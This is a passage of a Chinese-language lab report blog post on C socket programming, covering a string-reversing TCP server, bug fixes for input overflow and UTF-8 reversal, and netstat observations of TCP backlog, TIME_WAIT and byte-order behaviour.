	<span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			is_esc = <span class="number">0</span>;</span><br><span class="line">			<span class="built_in">memset</span>(recv_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(recv_msg)); <span class="comment">//接收数组置零</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">            函数原型：int recv(int sockfd, void *buf, int len, int flags); </span></span><br><span class="line"><span class="comment">			参数：</span></span><br><span class="line"><span class="comment">			sockfd：用于接收数据的socket的描述符</span></span><br><span class="line"><span class="comment">			buf：指向数据的指针</span></span><br><span class="line"><span class="comment">			len：接收数据大小</span></span><br><span class="line"><span class="comment">			flags：额外选项。本次实验设为0</span></span><br><span class="line"><span class="comment">			返回值：</span></span><br><span class="line"><span class="comment">			成功：返回接收的数据大小</span></span><br><span class="line"><span class="comment">			失败：如果对方已关闭连接，返回0；其他错误返回-1，并在全局变量errno中记录错误类型</span></span><br><span class="line"><span class="comment">			*************************************************/</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment">/* 若连接断开则退出此客户机的连接，监听下一个客户机 */</span></span><br><span class="line">			<span class="keyword">if</span> (recv(server_sock_data, recv_msg, <span class="keyword">sizeof</span>(recv_msg), <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"Connection interrupted\n\n"</span>);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">            </span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"Recv: %s\n"</span>, recv_msg);</span><br><span class="line">			<span class="keyword">if</span> (errno)</span><br><span class="line">			&#123;</span><br><span class="line">				perror(<span class="string">"显示消息失败"</span>);</span><br><span class="line">				<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			<span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(recv_msg); i++)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span>(recv_msg[i] == <span class="number">27</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					is_esc = <span class="number">1</span>;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">/* 接收到bye或者esc就断开连接 */</span></span><br><span class="line">			<span class="keyword">if</span> (<span class="built_in">strcmp</span>(recv_msg,stop_word) == <span class="number">0</span> || is_esc )</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">            <span class="comment">/* 字符串逆序 */</span></span><br><span class="line">			strrev(recv_msg);</span><br><span class="line">			</span><br><span class="line">			<span class="comment">/* 发送消息 */</span></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"Send: %s\n"</span>, recv_msg);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">			函数原型：int send(int sockfd, const void *buf, int len, int flags); </span></span><br><span class="line"><span class="comment">			接收4个参数：</span></span><br><span class="line"><span class="comment">			sockfd：用于发送数据的socket的描述符</span></span><br><span class="line"><span class="comment">			buf：指向数据的指针</span></span><br><span class="line"><span class="comment">			len：发送数据大小</span></span><br><span class="line"><span class="comment">			flags：额外选项。本次实验设为0</span></span><br><span class="line"><span class="comment">			返回值：</span></span><br><span class="line"><span class="comment">			成功：返回发送的数据大小</span></span><br><span class="line"><span class="comment">			失败：返回-1，并在全局变量errno中记录错误类型</span></span><br><span class="line"><span class="comment">			*************************************************/</span></span><br><span class="line">			send(server_sock_data, recv_msg, <span class="built_in">strlen</span>(recv_msg), <span class="number">0</span>);</span><br><span class="line">			<span class="keyword">if</span> (errno)</span><br><span class="line">			&#123;</span><br><span class="line">				perror(<span class="string">"发送消息失败"</span>);</span><br><span class="line">				<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">/* 关闭数据socket */</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">		函数原型：int close(int sockfd); </span></span><br><span class="line"><span class="comment">		参数：</span></span><br><span class="line"><span class="comment">		sockfd：要关闭的socket的描述符</span></span><br><span class="line"><span class="comment">		返回值：</span></span><br><span class="line"><span class="comment">		成功：返回0</span></span><br><span class="line"><span class="comment">		失败：返回-1，并在全局变量errno中记录错误类型</span></span><br><span class="line"><span class="comment">		*************************************************/</span></span><br><span class="line">		<span class="built_in">close</span>(server_sock_data);</span><br><span class="line">		<span class="keyword">if</span> (errno)</span><br><span class="line">		&#123;</span><br><span class="line">			perror(<span class="string">"关闭数据socket失败"</span>);</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/* 关闭监听socket */</span></span><br><span class="line">    </span><br><span class="line">	<span class="built_in">close</span>(server_sock_listen);</span><br><span class="line">	<span class="keyword">if</span> (errno)</span><br><span class="line">    &#123;</span><br><span class="line">		perror(<span class="string">"关闭监听socket失败"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h4 id="3-运行截图"><a href="#3-运行截图" class="headerlink" title="(3) 运行截图"></a>(3) 运行截图</h4><p><img src="/images/loading.gif" data-original="/posts/865a19fa/image-20200322211841379.png" alt="image-20200322211841379"></p>
<h4 id="4-错误纠正"><a href="#4-错误纠正" class="headerlink" title="(4) 错误纠正"></a>(4) 错误纠正</h4><p>1°使用gets()函数输入消息报错 </p>
<p><img src="/images/loading.gif" data-original="/posts/865a19fa/image-20200322211849237.png" alt="image-20200322211849237"></p>
<p>原因在于gets()函数不会检查字符串的的长度，字符串过长会导致溢出，溢出的字符可能会覆盖一些重要的数据造成不可预料的后果，缓冲区溢出可能会作为蠕虫病毒的传播途径。</p>
<p>用fgets()替代</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 不接收换行符的fgets()函数 */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">my_fgets</span><span class="params">(<span class="keyword">char</span> data[], <span class="keyword">int</span> count)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fgets(data, count, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="comment">/* 找出data中的"\n" */</span></span><br><span class="line">    <span class="keyword">char</span> *<span class="built_in">find</span> = <span class="built_in">strchr</span>(data, <span class="string">'\n'</span>);</span><br><span class="line">    <span class="comment">/* 截取换行符前的字符串 */</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">find</span>)</span><br><span class="line">        *<span class="built_in">find</span> = <span class="string">'\0'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>2°含中文字符串逆序出现乱码 </p>
<p><img src="/images/loading.gif" data-original="/posts/865a19fa/image-20200322211858348.png" alt="image-20200322211858348"></p>
<p><img src="/images/loading.gif" data-original="/posts/865a19fa/image-20200322211904627.png" alt="image-20200322211904627"></p>
<p>这是因为中文字符并不是一个字节，按照全英文字符翻转是错误的，遂将字符串翻转后对中文字符两位两位进行翻转</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 字符串逆序函数 */</span></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">strrev</span><span class="params">(<span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">      <span class="keyword">char</span> *p1, *p2;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (! str || ! *str)</span><br><span class="line">		  <span class="keyword">return</span> str;</span><br><span class="line">      <span class="keyword">for</span> (p1 = str, p2 = str + <span class="built_in">strlen</span>(str) - <span class="number">1</span>; p2 &gt; p1; ++p1, --p2)</span><br><span class="line">	  &#123;</span><br><span class="line">		  *p1 ^= *p2;</span><br><span class="line">		  *p2 ^= *p1;</span><br><span class="line">		  *p1 ^= *p2;</span><br><span class="line">	  &#125;</span><br><span class="line">	  <span class="comment">/* UTF-8汉字一个是三个字节，进行相应逆序转化 */</span></span><br><span class="line">	  <span class="keyword">for</span> (p2 = str + <span class="built_in">strlen</span>(str) - <span class="number">1</span>; p2 &gt;= str; --p2)</span><br><span class="line">	  &#123;</span><br><span class="line">		  <span class="keyword">if</span> (*p2&amp;<span class="number">0x80</span>)<span class="comment">//最高位为1</span></span><br><span class="line">		  &#123;</span><br><span class="line">			  </span><br><span class="line">			  *p2 ^= *(p2<span class="number">-1</span>);</span><br><span class="line">			  *(p2<span class="number">-1</span>) ^= *p2;</span><br><span class="line">			  *p2 ^= *(p2<span class="number">-1</span>);</span><br><span class="line">			  p2--;</span><br><span class="line">		  &#125;</span><br><span class="line">	  &#125;</span><br><span class="line">      <span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><img src="/images/loading.gif" data-original="/posts/865a19fa/image-20200322211923677.png" alt="image-20200322211923677"></p>
<p><img src="/images/loading.gif" data-original="/posts/865a19fa/image-20200322211928735.png" alt="image-20200322211928735"></p>
<p>可以见到翻转结果依然错误，但是可以发现你好对应的是6个字符，可知一个汉字应该对应的是3个字符，后查阅资料得知UTF-8编码中一个汉字占3个字符，遂做下列改动</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 字符串逆序函数 */</span></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">strrev</span><span class="params">(<span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">      <span class="keyword">char</span> *p1, *p2;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (! str || ! *str)</span><br><span class="line">		  <span class="keyword">return</span> str;</span><br><span class="line">      <span class="keyword">for</span> (p1 = str, p2 = str + <span class="built_in">strlen</span>(str) - <span class="number">1</span>; p2 &gt; p1; ++p1, --p2)</span><br><span class="line">	  &#123;</span><br><span class="line">		  *p1 ^= *p2;</span><br><span class="line">		  *p2 ^= *p1;</span><br><span class="line">		  *p1 ^= *p2;</span><br><span class="line">	  &#125;</span><br><span class="line">	  <span class="comment">/* UTF-8汉字一个是三个字节，进行相应逆序转化 */</span></span><br><span class="line">	  <span class="keyword">for</span> (p2 = str + <span class="built_in">strlen</span>(str) - <span class="number">1</span>; p2 &gt;= str; --p2)</span><br><span class="line">	  &#123;</span><br><span class="line">		  <span class="keyword">if</span> (*p2&amp;<span class="number">0x80</span>)<span class="comment">//最高位为1</span></span><br><span class="line">		  &#123;</span><br><span class="line">			  </span><br><span class="line">			  *p2 ^= *(p2<span class="number">-2</span>);</span><br><span class="line">			  *(p2<span class="number">-2</span>) ^= *p2;</span><br><span class="line">			  *p2 ^= *(p2<span class="number">-2</span>);</span><br><span class="line">			  p2 = p2<span class="number">-2</span>;</span><br><span class="line">		  &#125;</span><br><span class="line">	  &#125;</span><br><span class="line">      <span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>成功解决问题！</p>
<p>3°客户机的突然连接中断会导致服务器陷入死循环</p>
<p><img src="/images/loading.gif" data-original="/posts/865a19fa/image-20200322211940332.png" alt="image-20200322211940332"></p>
<p>原因是在客户机失联后服务器一直接收到空消息而陷入死循环，于是对第二个while(1)内做如下改动,利用recv()的返回值增加一个判断连接是否存在的语句</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			is_esc = <span class="number">0</span>;</span><br><span class="line">			<span class="built_in">memset</span>(recv_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(recv_msg)); <span class="comment">//接收数组置零</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">            函数原型：int recv(int sockfd, void *buf, int len, int flags); </span></span><br><span class="line"><span class="comment">			参数：</span></span><br><span class="line"><span class="comment">			sockfd：用于接收数据的socket的描述符</span></span><br><span class="line"><span class="comment">			buf：指向数据的指针</span></span><br><span class="line"><span class="comment">			len：接收数据大小</span></span><br><span class="line"><span class="comment">			flags：额外选项。本次实验设为0</span></span><br><span class="line"><span class="comment">			返回值：</span></span><br><span class="line"><span class="comment">			成功：返回接收的数据大小</span></span><br><span class="line"><span class="comment">			失败：如果对方已关闭连接，返回0；其他错误返回-1，并在全局变量errno中记录错误类型</span></span><br><span class="line"><span class="comment">			*************************************************/</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment">/* 若连接断开则退出此客户机的连接，监听下一个客户机 */</span></span><br><span class="line">			<span class="keyword">if</span> (recv(server_sock_data, recv_msg, <span class="keyword">sizeof</span>(recv_msg), <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"Connection interrupted\n\n"</span>);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br></pre></td></tr></table></figure></div>
<p>同样对客户机增加判断服务器是否有连接的语句</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 接收数组置零 */</span></span><br><span class="line">		<span class="built_in">memset</span>(recv_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(recv_msg));</span><br><span class="line">        </span><br><span class="line">        <span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">		函数原型: int recv(int sockfd, void *buf, int len, int flags); </span></span><br><span class="line"><span class="comment">		参数：</span></span><br><span class="line"><span class="comment">		sockfd：用于接收数据的socket的描述符</span></span><br><span class="line"><span class="comment">		buf：指向数据的指针</span></span><br><span class="line"><span class="comment">		len：接收数据大小</span></span><br><span class="line"><span class="comment">		flags：额外选项。本次实验设为0</span></span><br><span class="line"><span class="comment">		返回值：</span></span><br><span class="line"><span class="comment">		成功：返回接收的数据大小</span></span><br><span class="line"><span class="comment">		失败：如果对方已关闭连接，返回0；其他错误返回-1，并在全局变量errno中记录错误类型</span></span><br><span class="line"><span class="comment">		*************************************************/</span></span><br><span class="line">		<span class="keyword">if</span> (recv(client_sock, recv_msg, <span class="keyword">sizeof</span>(recv_msg), <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"Connection interrupted\n"</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Server: %s\n"</span>, recv_msg);</span><br></pre></td></tr></table></figure></div>
<p><img src="/images/loading.gif" data-original="/posts/865a19fa/image-20200322211950103.png" alt="image-20200322211950103"></p>
<p><img src="/images/loading.gif" data-original="/posts/865a19fa/image-20200322211954902.png" alt="image-20200322211954902"></p>
<p>问题解决！</p>
<h3 id="Solution-②"><a href="#Solution-②" class="headerlink" title="Solution ②:"></a>Solution ②:</h3><p>backlog：该socket上完成队列的最大长度。完成队列是指已完成三次握手(established)，但尚未被服务器接受（accept）的客户机</p>
<p>使用端口为12345，使用netstat命令观察服务器socket状态：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">netstat -an|grep 12345</span><br></pre></td></tr></table></figure></div>
<p>其中显示的各列的含义如下</p>
<p><img src="/images/loading.gif" data-original="/posts/865a19fa/image-20200322212008955.png" alt="image-20200322212008955"></p>
<p>Recv-Q表示的当前等待服务端调用接受完成三次握手的listen backlog数值</p>
<p><strong>TCP有限状态机图</strong></p>
<p><img src="/images/loading.gif" data-original="/posts/865a19fa/image-20200322212016601.png" alt="image-20200322212016601"></p>
<p>当设置     backlog = 0 时 </p>
<p><img src="/images/loading.gif" data-original="/posts/865a19fa/image-20200322212025109.png" alt="image-20200322212025109"></p>
<p>当设置     backlog = 1 时 </p>
<p><img src="/images/loading.gif" data-original="/posts/865a19fa/image-20200322212031306.png" alt="image-20200322212031306"></p>
<p>当设置     backlog = 2 时 </p>
<p><img src="/images/loading.gif" data-original="/posts/865a19fa/image-20200322212036654.png" alt="image-20200322212036654"></p>
<p>当设置     backlog = 3 时 </p>
<p><img src="/images/loading.gif" data-original="/posts/865a19fa/image-20200322212041952.png" alt="image-20200322212041952"></p>
<p>由此可发现，对于服务器而言，state为SYN_RECV的状态个数为【客户机个数-backlog-2】（当客户机&lt;backlog+2则为0），另外Recv-Q=backlog+1,结合Recv-Q的含义可知，实际在完成握手后未被服务器接受的客户机个数应该是<strong>backlog+1</strong></p>
<p>因此若限定服务器只能accept一个客户机不能设置backlog=0，而是应该将监听socket关闭</p>
<p>对连接的客户机做一定的操作，设置     backlog = 1 <br>做如下操作<br>服务器开启前<br>服务器开始运行<br>客户机1、2、3、4依次连接服务器<br>客户机1、2、3、4依次向服务器发送hi<br>客户机1、2、3、4依次发送bye断开与服务器的连接 </p>
<p>（1）服务器开启前和服务开始运行</p>
<p><img src="/images/loading.gif" data-original="/posts/865a19fa/image-20200322212052833.png" alt="image-20200322212052833"></p>
<p>LISTEN网络中所有主机</p>
<p>（2）客户机1、2、3、4依次连接服务器</p>
<p><img src="/images/loading.gif" data-original="/posts/865a19fa/image-20200322212106528.png" alt="image-20200322212106528"></p>
<p><img src="/images/loading.gif" data-original="/posts/865a19fa/image-20200322212111683.png" alt="image-20200322212111683"></p>
<p>对于客户机而言，客户机主动打开，发送SYN进入SYN_SENT,收到服务器发来的SYN、ACK后便认为其与服务器已经建立了连接，向服务器发送ACK,进入ESTABLISHED状态。<br>对于服务器而言，服务器被动打开，接收客户机发来的SYN后向客户机发送SYN、ACK，然后客户机向服务器发送ACK，首先客户机1被服务器ACCEPT，成功ESTABLISHED后进入数据传送阶段；客户机2、3也进入ESTABLISHED状态，但未被服务器ACCEPT，处于完成队列中，另外一个由于backlog限制，完成队列最大长度为2，客户机4的ACK未能被服务器接受而处于SYN_RECV状态。</p>
<p>（3）客户机1、2、3、4依次向服务器发送hi</p>
<p><img src="/images/loading.gif" data-original="/posts/865a19fa/image-20200322212121141.png" alt="image-20200322212121141"></p>
<p><img src="/images/loading.gif" data-original="/posts/865a19fa/image-20200322212127621.png" alt="image-20200322212127621"></p>
<p>观察到STATE并未改变</p>
<p>（4）客户机1、2、3、4依次发送bye断开与服务器的连接</p>
<p><img src="/images/loading.gif" data-original="/posts/865a19fa/image-20200322212135630.png" alt="image-20200322212135630"></p>
<p><img src="/images/loading.gif" data-original="/posts/865a19fa/image-20200322212141237.png" alt="image-20200322212141237"></p>
<p>对于服务器而言，由于客户机1断开连接，完成队列中的客户机2被ACCEPT，客户机4进入完成队列，显示状态为ESTABLISHED，而随着客户机的主动断开连接，服务器开始被动关闭连接，收到客户机发送的FIN后向客户机发送ACK进入CLOSE_WAIT状态，通过程序中的close(server_sock_data)命令向客户机发送FIN，进入LAST-ACK状态，再收到客户机的ACK便成功断开连接。<br>对于客户机而言，客户机主动关闭连接，向服务器发送FIN，进入FIN_WAIT_1状态，再收到服务器发来的ACK后进入FIN_WAIT_2状态，然后收到服务器发来的FIN后向服务器发送ACK进入TIME_WAIT状态，要定时经过两倍报文段寿命（2MSL)后才能完成断开与服务器的连接，相应的端口才会被回收。</p>
<h3 id="Solution-③"><a href="#Solution-③" class="headerlink" title="Solution ③:"></a>Solution ③:</h3><p>先运行下面命令</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">sudo sysctl net.ipv4.tcp_timestamps=0</span><br></pre></td></tr></table></figure></div>
<p>在客户机代码中main()函数开头增加绑定客户机IP和端口语句，其中绑定端口作为mian()函数的参数传入</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">client_addr</span>;</span></span><br><span class="line"><span class="comment">/* 指定客户机地址 */</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">/* 用于socket创建通信连接的类型，这里就是ipv4地址类型的通信连接可用 */</span></span><br><span class="line">client_addr.sin_family = AF_INET;</span><br><span class="line"><span class="comment">/* 整型变量从主机字节顺序转变成网络字节顺序：Big-Endian */</span></span><br><span class="line"><span class="comment">/* argv[3]从main函数接收，其是客户机要绑定的端口 */</span></span><br><span class="line">client_addr.sin_port = htons(atoi(argv[<span class="number">3</span>]));</span><br><span class="line"><span class="comment">/* 获取客户机机所有IP */</span></span><br><span class="line">client_addr.sin_addr.s_addr = htonl(INADDR_ANY); </span><br><span class="line"><span class="comment">/* 进行零填充 */</span></span><br><span class="line"><span class="built_in">memset</span>(client_addr.sin_zero, <span class="number">0</span>, <span class="keyword">sizeof</span>(client_addr.sin_zero)); </span><br><span class="line"><span class="keyword">if</span> (errno)</span><br><span class="line">&#123;</span><br><span class="line">    perror(<span class="string">"指定客户机地址失败"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 绑定socket与客户机地址 */</span></span><br><span class="line"><span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">函数原型: int bind(int sockfd, const struct sockaddr *addr, int addrlen); </span></span><br><span class="line"><span class="comment">参数：</span></span><br><span class="line"><span class="comment">sockfd：要绑定的socket的描述符</span></span><br><span class="line"><span class="comment">addr：要绑定的地址。此处为指向通用地址结构的指针，使用时，要进行强制类型转换</span></span><br><span class="line"><span class="comment">addrlen：地址结构大小。可使用sizeof自动计算</span></span><br><span class="line"><span class="comment">返回值：</span></span><br><span class="line"><span class="comment">成功：返回0</span></span><br><span class="line"><span class="comment">失败：返回-1，并在全局变量errno中记录错误类型</span></span><br><span class="line"><span class="comment">*************************************************/</span></span><br><span class="line">bind(client_sock, (struct sockaddr *)&amp;client_addr, <span class="keyword">sizeof</span>(client_addr));</span><br><span class="line"><span class="keyword">if</span> (errno)</span><br><span class="line">&#123;</span><br><span class="line">    perror(<span class="string">"绑定socket与客户机地址失败"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>所选择客户机绑定的端口为22535</p>
<p>使用如下命令查看tcp端口状态</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">netstat -an|grep 22535</span><br></pre></td></tr></table></figure></div>
<blockquote>
<p>1.运行客户机连接服务器，由客户机主动close，再次运行客户机，观察结果</p>
</blockquote>
<p><img src="/images/loading.gif" data-original="/posts/865a19fa/image-20200322212159305.png" alt="image-20200322212159305"></p>
<p>可以发现当客户机close后，端口并不会马上被回收，而是处于TIME_WAIT的状态，再次用同一个客户机端口运行客户机程序则会在绑定阶段提示Address already in use的错误。</p>
<blockquote>
<p>2、运行客户机连接服务器，由服务器主动close，再次运行客户机，观察结果</p>
</blockquote>
<p><img src="/images/loading.gif" data-original="/posts/865a19fa/image-20200322212207616.png" alt="image-20200322212207616"></p>
<p>可以发现服务器close后端口进入进入FIN_WAIT2状态，客户机端进入CLOSE_WAIT状态，继续运行客户机后跳出程序端口被释放，再次运行客户机程序并没有在绑定阶段提示端口占用的错误，仅在连接服务器部分报错</p>
<p>由此我们可以看出，如果在客户端的程序里，bind()了某个端口（比如22535），首先就要考虑这个端口是否被占用了，这大大增加实现的麻烦程度。其次如果端口号在程序中是固定值，那么该客户机就只能运行一个客户端，并且由上面我们也可以看出客户机不能使用同一个端口进行短时间的多次断线重连，这对使用者而言是不友好的。因此客户机不建议bind固定端口。</p>
<h3 id="Solution-④"><a href="#Solution-④" class="headerlink" title="Solution ④:"></a>Solution ④:</h3><p>由于客户端程序的<strong>inet_addr</strong>作用是将一个<strong>IP</strong>字符串转化为一个<strong>网络字节序</strong>的整数值，服务端程序的绑定IP地址是INADDR_ANY即0.0.0.0，网路字节序和主机字节序是一样的，因此下面对照试验不对IP地址进行改变。</p>
<p>我们在同一台linux主机下尝试以下几种情况：</p>
<p>（1）只有服务端的port不进行字节序转化</p>
<p><img src="/images/loading.gif" data-original="/posts/865a19fa/image-20200322212218841.png" alt="image-20200322212218841"></p>
<p>（2）只有客户端的port不进行转化</p>
<p><img src="/images/loading.gif" data-original="/posts/865a19fa/image-20200322212225951.png" alt="image-20200322212225951"></p>
<p>（3）客户端和服务端的port均不进行转化</p>
<p><img src="/images/loading.gif" data-original="/posts/865a19fa/image-20200322212236381.png" alt="image-20200322212236381"></p>
<p>由此发现只有两端都进行网络字节序转化和都不进行网络字节序转化才可正常连通，这是因为作者使用的centos7.6的主机字节序是<strong>Little-Endian</strong>，而网络字节序是<strong>Big-Endian</strong>。</p>
<p>IP地址和端口虽然没有作为数据传入send()、recv()，但是它们是间接传入这两个函数的：</p>
<p><img src="/images/loading.gif" data-original="/posts/865a19fa/image-20200322212250014.png" alt="image-20191126211038447"><img src="/images/loading.gif" data-original="/posts/865a19fa/image-20200322212306108.png" alt="image-20200322212306108"></p>
<p>观察函数参数可以发现sockfd这个参数，其含义是某个socket的描述符，每个sockfd与socket进行一一对应，在服务端和客户端，每一个socket都会绑定相应的IP地址和端口号。由于不同主机的字节序可能不同，因此必须对发送的所有数据（包括IP和端口号）进行网络字节序转化。</p>
<p>主机字节序和CPU有关：Intel的x86系列采用Little-Endian，<br>其他如PowerPC 、SPARC和Motorola处理器则采用Big-Endian<br>网络字节序：TCP/IP各层协议将字节序定义为Big-Endian</p>
<p>如果不转化的话，通信双方就可能会无法建立连接，无法进行下一步的数据传输</p>
<h2 id="任务2：字符串转换-网络服务（并发）"><a href="#任务2：字符串转换-网络服务（并发）" class="headerlink" title="任务2：字符串转换-网络服务（并发）"></a>任务2：字符串转换-网络服务（并发）</h2><h3 id="任务要求：-1"><a href="#任务要求：-1" class="headerlink" title="任务要求："></a>任务要求：</h3><p><img src="/images/loading.gif" data-original="/posts/865a19fa/image-20200322212327702.png" alt="image-20200322212327702"></p>
<h3 id="Solution-①-1"><a href="#Solution-①-1" class="headerlink" title="Solution ①:"></a>Solution ①:</h3><p>此任务只需修改服务器代码</p>
<h4 id="1-服务器的源代码Server-fork-c"><a href="#1-服务器的源代码Server-fork-c" class="headerlink" title="(1) 服务器的源代码Server_fork.c"></a>(1) 服务器的源代码Server_fork.c</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;error.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="comment">/* 字符串逆序函数 */</span></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">strrev</span><span class="params">(<span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">      <span class="keyword">char</span> *p1, *p2;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (! str || ! *str)</span><br><span class="line">		  <span class="keyword">return</span> str;</span><br><span class="line">      <span class="keyword">for</span> (p1 = str, p2 = str + 